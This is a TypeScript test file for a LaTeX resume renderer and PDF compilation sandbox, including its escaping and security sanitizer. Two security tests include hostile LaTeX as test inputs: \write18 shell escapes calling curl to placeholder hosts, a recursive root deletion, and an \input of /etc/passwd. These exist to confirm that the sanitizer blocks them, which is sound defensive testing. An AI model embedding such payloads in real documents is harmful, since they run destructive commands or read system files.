import { describe, it, expect } from 'vitest';
import { sql } from '../db/index.js';
import { escapeLatex, sanitizeLatexSource, renderLatexResume } from './latex.js';
import { pdfCompiler } from './compiler.js';
import { MasterResumeData, ResumePlan } from './types.js';
import { masterTemplateEngine } from './master.js';

describe('Phase 3.3: Modular LaTeX / PDF Compilation Sandbox & Quality Checks', () => {
  describe('LaTeX Escaping & Security Sanitization', () => {
    it('escapes reserved LaTeX characters safely', () => {
      const raw = 'C# & TypeScript, 99.9% cache hit ratio, $150k cost savings, user_profile_table {test}';
      const escaped = escapeLatex(raw);

      expect(escaped).toContain('C\\#');
      expect(escaped).toContain('\\&');
      expect(escaped).toContain('99.9\\%');
      expect(escaped).toContain('\\$150k');
      expect(escaped).toContain('user\\_profile\\_table');
      expect(escaped).toContain('\\{test\\}');
    });

    it('blocks malicious LaTeX directives and shell escapes', () => {
      const malicious1 = '\\documentclass{article}\\begin{document}\\write18{curl evil.com}\\end{document}';
      const check1 = sanitizeLatexSource(malicious1);
      expect(check1.safe).toBe(false);
      expect(check1.reason).toContain('Shell Escape');

      const malicious2 = '\\documentclass{article}\\begin{document}\\immediate\\write18{rm -rf /}\\end{document}';
      const check2 = sanitizeLatexSource(malicious2);
      expect(check2.safe).toBe(false);

      const malicious3 = '\\documentclass{article}\\begin{document}\\input{/etc/passwd}\\end{document}';
      const check3 = sanitizeLatexSource(malicious3);
      expect(check3.safe).toBe(false);
      expect(check3.reason).toContain('File Inclusion');

      const benign = '\\documentclass{article}\\begin{document}Hello World\\end{document}';
      const checkBenign = sanitizeLatexSource(benign);
      expect(checkBenign.safe).toBe(true);
    });
  });

  describe('Template Rendering', () => {
    const sampleData: MasterResumeData = {
      contact: {
        fullName: 'Jane Developer',
        email: 'jane@example.com',
        location: 'Bengaluru, India',
        github: 'https://github.com/janedev',
      },
      summary: 'Senior Software Engineer with focus on scalable cloud platforms & systems.',
      skills: [
        {
          category: 'Languages',
          skills: ['TypeScript', 'Go', 'C#'],
          factIds: ['fact-101'],
        },
      ],
      experience: [
        {
          company: 'Acme Cloud & Scale Ltd',
          role: 'Senior Infrastructure Engineer',
          startDate: '2021-01',
          endDate: 'Present',
          bullets: [
            {
              text: 'Architected distributed event bus processing 50k events/sec with 99.99% reliability.',
              factId: 'fact-101',
            },
          ],
        },
      ],
      projects: [],
      education: [
        {
          institution: 'State University',
          degree: 'B.Tech in Computer Science',
          graduationDate: '2019-05',
        },
      ],
    };

    it('renders modern-deedy template with traceability comments and escaped characters', () => {
      const plan: ResumePlan = {
        factIds: ['fact-101'],
        sectionOrder: ['summary', 'skills', 'experience', 'education'],
        templateName: 'modern-deedy',
      };

      const latex = renderLatexResume(sampleData, plan);

      expect(latex).toContain('\\documentclass[10pt,letterpaper]{article}');
      expect(latex).toContain('Jane Developer');
      expect(latex).toContain('Acme Cloud \\& Scale Ltd');
      expect(latex).toContain('C\\#');
      expect(latex).toContain('% factId: fact-101');
      expect(latex).toContain('\\end{document}');
    });

    it('renders clean-classic template', () => {
      const plan: ResumePlan = {
        factIds: ['fact-101'],
        sectionOrder: ['skills', 'experience', 'education'],
        templateName: 'clean-classic',
      };

      const latex = renderLatexResume(sampleData, plan);

      expect(latex).toContain('\\documentclass[11pt,a4paper]{article}');
      expect(latex).not.toContain('Professional Summary'); // Not in sectionOrder!
      expect(latex).toContain('Technical Skills');
    });
  });

  describe('PDF Compilation Sandbox & Quality Checks', () => {
    it('compiles valid PDF binary within 2-page budget and saves artifact in Supabase', async () => {
      if (!sql) {
        console.warn('Skipping test: No database connection');
        return;
      }

      // 1. Setup candidate and resume version
      const [candidate] = await sql<{ id: string }[]>`
        INSERT INTO profile.candidate_profiles (full_name, email)
        VALUES ('Sandbox Candidate', ${`sandbox-${Date.now()}@example.com`})
        RETURNING id
      `;

      const [fact] = await sql<{ id: string }[]>`
        INSERT INTO profile.candidate_facts (candidate_id, category, statement, verified)
        VALUES (${candidate.id}, 'skill', 'Full-stack development with React and Node.js', true)
        RETURNING id
      `;

      const master = await masterTemplateEngine.createMasterResume(
        candidate.id,
        'Sandbox Master Resume',
        {
          contact: { fullName: 'Sandbox Candidate', email: 'sandbox@example.com' },
          summary: 'Software Engineer',
          skills: [{ category: 'Frontend', skills: ['React'], factIds: [fact.id] }],
          experience: [],
          projects: [],
          education: [],
        }
      );

      // 2. Render LaTeX
      const plan: ResumePlan = {
        factIds: [fact.id],
        sectionOrder: ['summary', 'skills'],
        templateName: 'modern-deedy',
      };

      const latex = renderLatexResume(
        {
          contact: { fullName: 'Sandbox Candidate', email: 'sandbox@example.com' },
          summary: 'Software Engineer specializing in scalable React frontends.',
          skills: [{ category: 'Core', skills: ['React', 'TypeScript'], factIds: [fact.id] }],
          experience: [],
          projects: [],
          education: [],
        },
        plan
      );

      // 3. Compile and Store Artifact
      const result = await pdfCompiler.compileAndStore(latex, master.versionId);

      expect(result.success).toBe(true);
      expect(result.pageCount).toBeLessThanOrEqual(2);
      expect(result.withinBudget).toBe(true);
      expect(result.pdfBuffer.slice(0, 5).toString()).toBe('%PDF-');
      expect(result.contentHash).toBeDefined();
      expect(result.artifact?.id).toBeDefined();
      const artifactId = result.artifact!.id;

      // 4. Verify artifact linked to resume version in Supabase
      const [versionRow] = await sql<{ artifact_id: string }[]>`
        SELECT artifact_id
        FROM docs.resume_versions
        WHERE id = ${master.versionId}
      `;
      expect(versionRow.artifact_id).toBe(artifactId);

      // 5. Verify artifact in docs.artifacts
      const [artifactRow] = await sql<{ mime_type: string; size_bytes: number }[]>`
        SELECT mime_type, size_bytes
        FROM docs.artifacts
        WHERE id = ${artifactId}
      `;
      expect(artifactRow.mime_type).toBe('application/pdf');
      expect(Number(artifactRow.size_bytes)).toBeGreaterThan(0);
    });

    it('rejects malicious LaTeX during compilation', async () => {
      const maliciousLatex = '\\documentclass{article}\\begin{document}\\write18{curl hack.com}\\end{document}';

      await expect(pdfCompiler.compileAndStore(maliciousLatex)).rejects.toThrow(
        'LaTeX Security Sandbox Violation'
      );
    });
  });
});
